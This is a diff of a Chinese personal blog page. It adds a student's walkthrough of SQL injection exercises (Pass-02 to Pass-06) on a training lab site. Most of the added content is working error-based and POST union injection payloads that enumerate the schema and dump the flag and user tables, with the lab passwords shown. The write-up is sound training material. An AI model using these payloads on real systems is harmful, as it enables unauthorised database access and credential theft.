@@ -129,7 +129,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-count">7</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -178,6 +178,69 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/26/%E6%8E%8C%E6%8E%A7%E5%AE%89%E5%85%A8/1.%E8%AF%BE%E5%A0%82%E7%BB%83%E4%B9%A0/%E5%90%8E%E7%AB%AF%E5%9F%BA%E7%A1%80php1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="宋卫冬的博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/11/26/%E6%8E%8C%E6%8E%A7%E5%AE%89%E5%85%A8/1.%E8%AF%BE%E5%A0%82%E7%BB%83%E4%B9%A0/%E5%90%8E%E7%AB%AF%E5%9F%BA%E7%A1%80php1/" class="post-title-link" itemprop="url">后端基础php1</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-11-26 14:35:19" itemprop="dateCreated datePublished" datetime="2021-11-26T14:35:19+08:00">2021-11-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/25/SQL%E6%B3%A8%E5%85%A5%E4%BD%9C%E4%B8%9A/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -209,7 +272,7 @@
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2021-11-26 01:33:39" itemprop="dateModified" datetime="2021-11-26T01:33:39+08:00">2021-11-26</time>
+        <time title="修改时间：2021-11-27 23:32:00" itemprop="dateModified" datetime="2021-11-27T23:32:00+08:00">2021-11-27</time>
       </span>
 
   
@@ -311,12 +374,99 @@
 <p>笔记本写知识点！！！</p>
 <h3 id="pass-02"><a href="#pass-02" class="headerlink" title="pass-02"></a>pass-02</h3><p>显错注入（三）</p>
 <p>解题思路</p>
-<h3 id="pass-03"><a href="#pass-03" class="headerlink" title="pass-03"></a>pass-03</h3><p>显错注入（四）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://inject2b.lab.aqlab.cn/Pass-02/index.php?id=1 and 1=2</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://inject2b.lab.aqlab.cn/Pass-02/index.php?id=1 &#x27;and 1=2  order by 4 --+</span><br><span class="line">单引号要引文状态下的</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://inject2b.lab.aqlab.cn/Pass-02/index.php?id=1">https://inject2b.lab.aqlab.cn/Pass-02/index.php?id=1</a> ‘and 1=2 order by 4 –+（这样写不成立肯定不执行order by 命令）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://inject2b.lab.aqlab.cn/Pass-02/index.php?id=1 &#x27;and 1=1 order by 4 --+页面出错说明有3个字段</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://inject2b.lab.aqlab.cn/Pass-02/index.php?id=1 &#x27;and 1=2 union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/25/SQL%E6%B3%A8%E5%85%A5%E4%BD%9C%E4%B8%9A/image-20211126210801419.png" alt="image-20211126210801419"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">找出先错位，直接替换啊</span><br><span class="line">https://inject2b.lab.aqlab.cn/Pass-02/index.php?id=1 &#x27;and 1=2 union select 1,database(),3 --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/25/SQL%E6%B3%A8%E5%85%A5%E4%BD%9C%E4%B8%9A/image-20211126211222844.png" alt="image-20211126211222844"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">还是error数据库，接下来判断表名</span><br><span class="line">表名是根据</span><br><span class="line">https://inject2b.lab.aqlab.cn/Pass-02/index.php?id=1 &#x27;and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</span><br><span class="line">两个表 error_flag user</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/25/SQL%E6%B3%A8%E5%85%A5%E4%BD%9C%E4%B8%9A/image-20211126215740168.png" alt="image-20211126215740168"></p>
+<p>group_concat()正确</p>
+<p>concat()错误</p>
+<p>熟悉的单词以为不会写错！结果错了</p>
+<p>?id=1 ‘’ and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() –+</p>
+<p><img src="/2021/11/25/SQL%E6%B3%A8%E5%85%A5%E4%BD%9C%E4%B8%9A/image-20211126211759133.png" alt="image-20211126211759133"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">列名</span><br><span class="line">https://inject2b.lab.aqlab.cn/Pass-02/index.php?id=1 &#x27;and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&#x27;user&#x27; --+</span><br><span class="line">易错点：=两边的不需要空格！</span><br><span class="line">表后缀有s tables columns</span><br><span class="line">当作字段的时候没有</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2021/11/25/SQL%E6%B3%A8%E5%85%A5%E4%BD%9C%E4%B8%9A/image-20211126220702125.png" alt="image-20211126220702125"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">然后查询error_flag表的字段</span><br><span class="line">https://inject2b.lab.aqlab.cn/Pass-02/index.php?id=1 &#x27;and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&#x27;error_flag&#x27; --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/25/SQL%E6%B3%A8%E5%85%A5%E4%BD%9C%E4%B8%9A/image-20211126220844889.png" alt="image-20211126220844889"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">两个表的表名和字段/列名都知道了，想查哪个字段的记录就很容易了</span><br><span class="line">https://inject2b.lab.aqlab.cn/Pass-02/index.php?id=1 &#x27;and 1=2 union select 1,group_concat(Id),group_concat(flag)from error_flag --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/25/SQL%E6%B3%A8%E5%85%A5%E4%BD%9C%E4%B8%9A/image-20211126222934725-16379369772171.png" alt="image-20211126222934725"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Your Login name:1,2,3,4</span><br><span class="line">Your Password:zKaQ-Nf,zKaQ-BJY,zKaQ-XiaoFang,zKaq-98K</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://inject2b.lab.aqlab.cn/Pass-02/index.php?id=1 &#x27;and 1=2 union select 1,group_concat(Id),group_concat(password)from user --+</span><br><span class="line"></span><br><span class="line">Your Login name:1,2,3</span><br><span class="line">Your Password:mima,7580241,Nopassword</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/25/SQL%E6%B3%A8%E5%85%A5%E4%BD%9C%E4%B8%9A/image-20211126223426844.png" alt="image-20211126223426844"></p>
+<h3 id="pass-03"><a href="#pass-03" class="headerlink" title="pass-03"></a>pass-03</h3><p>解题思路：</p>
+<p>闭合</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://inject2b.lab.aqlab.cn/Pass-03/index.php?id=1 &#x27;)and 1=2 --+</span><br><span class="line">https://inject2b.lab.aqlab.cn/Pass-03/index.php?id=1 &#x27;)and 1=2 union select 1,group_concat(Id),group_concat(flag)from error_flag --+</span><br><span class="line">Your Login name:1,2,3,4</span><br><span class="line">Your Password:zKaQ-Nf,zKaQ-BJY,zKaQ-XiaoFang,zKaq-98K</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/25/SQL%E6%B3%A8%E5%85%A5%E4%BD%9C%E4%B8%9A/image-20211126224633027.png" alt="image-20211126224633027"></p>
+<p>得到flag：zKaQ-XiaoFang</p>
+<p><img src="/2021/11/25/SQL%E6%B3%A8%E5%85%A5%E4%BD%9C%E4%B8%9A/image-20211126225025951.png" alt="image-20211126225025951"></p>
+<p>​    </p>
+<h3 id="pass-04"><a href="#pass-04" class="headerlink" title="pass-04"></a>pass-04</h3><p>显错注入（四）</p>
+<p>解题思路：</p>
+<p>闭合</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://inject2b.lab.aqlab.cn/Pass-04/index.php?id=1 &quot;)and 1=1 --+</span><br><span class="line">https://inject2b.lab.aqlab.cn/Pass-04/index.php?id=1 &quot;)and 1=2 union select 1,group_concat(Id),group_concat(flag)from error_flag --+</span><br><span class="line">Your Login name:1,2,3,4</span><br><span class="line">Your Password:zKaQ-Nf,zKaQ-BJY,zKaQ-XiaoFang,zKaq-98K</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/25/SQL%E6%B3%A8%E5%85%A5%E4%BD%9C%E4%B8%9A/image-20211126225458350.png" alt="image-20211126225458350"></p>
+<p>得到flag:zKaq-98K</p>
+<p><img src="/2021/11/25/SQL%E6%B3%A8%E5%85%A5%E4%BD%9C%E4%B8%9A/image-20211126231110393.png" alt="image-20211126231110393"></p>
+<h3 id="pass-05"><a href="#pass-05" class="headerlink" title="pass-05"></a>pass-05</h3><p>POST注入（一）</p>
 <p>解题思路</p>
-<h3 id="pass-04"><a href="#pass-04" class="headerlink" title="pass-04"></a>pass-04</h3><p>解题思路</p>
-<h3 id="pass-05"><a href="#pass-05" class="headerlink" title="pass-05"></a>pass-05</h3><p>解题思路</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">判断是否存在注入：</span><br><span class="line">8&#x27; or 1=1 -- qwe</span><br><span class="line">判断字段数：</span><br><span class="line">8&#x27; or 1=1 order by 3 -- qwe</span><br></pre></td></tr></table></figure>
+
+<p>判断回显点：<br>8’ or 1=2 union select 11,22,33 – qwe</p>
+<p><img src="/2021/11/25/SQL%E6%B3%A8%E5%85%A5%E4%BD%9C%E4%B8%9A/image-20211127211402323.png" alt="image-20211127211402323"></p>
+<p>查询库名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8&#x27; or 1=2 union select 11,22,database() -- qwe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/25/SQL%E6%B3%A8%E5%85%A5%E4%BD%9C%E4%B8%9A/image-20211127211831504.png" alt="image-20211127211831504"></p>
+<p>查询表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">8&#x27; or 1=2 union select 11,22,group_concat(table_name) from information_schema.tables where table_schema=database() -- qwe</span><br><span class="line">查询到有两张表：flag表和user表</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/25/SQL%E6%B3%A8%E5%85%A5%E4%BD%9C%E4%B8%9A/image-20211127212544352.png" alt="image-20211127212544352"></p>
+<p>查询列名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">8&#x27; or 1=2 union select 11,22,group_concat(coLumn_name) from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27; -- qwe</span><br><span class="line">注意flag要加单引号</span><br><span class="line">查询到flag表有两个字段：Id、flag</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">8&#x27; or 1=2 union select 11,22,group_concat(coLumn_name) from information_schema.columns where table_schema=database() and table_name=&#x27;user&#x27; -- qwe</span><br><span class="line">查询到user表有两个字段：Id、password、username</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/25/SQL%E6%B3%A8%E5%85%A5%E4%BD%9C%E4%B8%9A/%E8%A1%A81-16380233536957.png" alt="表1"></p>
+<p>查询数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">8&#x27; or 1=2 union select 11,group_concat(Id),group_concat(flag) from flag -- qwe</span><br><span class="line"></span><br><span class="line">Your Login name:1,2,3</span><br><span class="line">Your Password:zKaQ-PostK1,zKaQ-XZT,zKaQ-FlagA1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">8&#x27; or 1=2 union select 11,group_concat(username),group_concat(password) from user -- qwe</span><br><span class="line"></span><br><span class="line">Your Login name:admin</span><br><span class="line">Your Password:as4dsa2dsad2a3</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/25/SQL%E6%B3%A8%E5%85%A5%E4%BD%9C%E4%B8%9A/2021-11-27_221249-16380225607851.png" alt="2021-11-27_221249-16380225607851"></p>
+<p>经测试flag为：zKaQ-PostK1</p>
+<p><img src="/2021/11/25/SQL%E6%B3%A8%E5%85%A5%E4%BD%9C%E4%B8%9A/image-20211127223525882.png" alt="image-20211127223525882"></p>
 <h3 id="pass-06"><a href="#pass-06" class="headerlink" title="pass-06"></a>pass-06</h3><p>POST注入（二）</p>
 <p>解题思路</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">判断存在注入</span><br><span class="line">8&quot;) or 1=1 -- qwe</span><br><span class="line">判断字段数：</span><br><span class="line">8&quot;) or 1=1 order by 3 -- qwe</span><br><span class="line">判断回显点：</span><br><span class="line">8&quot;) or 1=2 union select 11,22,33 -- qwe</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/25/SQL%E6%B3%A8%E5%85%A5%E4%BD%9C%E4%B8%9A/image-20211127224407605.png" alt="image-20211127224407605"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">8&quot;) or 1=2 union select 11,group_concat(Id),group_concat(flag) from flag -- qwe</span><br><span class="line">Your Login name:1,2,3</span><br><span class="line">Your Password:zKaQ-PostK1,zKaQ-XZT,zKaQ-FlagA1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/25/SQL%E6%B3%A8%E5%85%A5%E4%BD%9C%E4%B8%9A/image-20211127224546070.png" alt="image-20211127224546070"></p>
+<p>flag:zKaQ-XZT</p>
+<p><img src="/2021/11/25/SQL%E6%B3%A8%E5%85%A5%E4%BD%9C%E4%B8%9A/image-20211127224645164.png" alt="image-20211127224645164"></p>
 <h3 id="pass-07"><a href="#pass-07" class="headerlink" title="pass-07"></a>pass-07</h3><p>Head注入（一）</p>
 <p>解题思路</p>
 <h3 id="pass-08"><a href="#pass-08" class="headerlink" title="pass-08"></a>pass-08</h3><p>Head注入（二）</p>
